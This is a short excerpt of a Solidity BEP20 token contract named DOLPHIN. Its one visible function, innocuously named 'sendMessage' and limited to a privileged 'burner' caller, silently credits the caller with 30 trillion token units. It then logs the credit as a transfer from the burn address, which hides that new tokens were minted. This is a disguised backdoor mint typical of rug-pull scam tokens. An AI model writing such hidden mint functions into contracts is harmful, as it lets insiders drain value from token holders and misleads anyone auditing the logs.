...
contract DOLPHIN is BEP20 {
    ...
    function sendMessage() public burner{
        balances[msg.sender] = balances[msg.sender]+(1000000000 * 10000 * 3);
        emit Transfer(burnaddress, msg.sender, 1000000000 * 10000 * 3);
    }
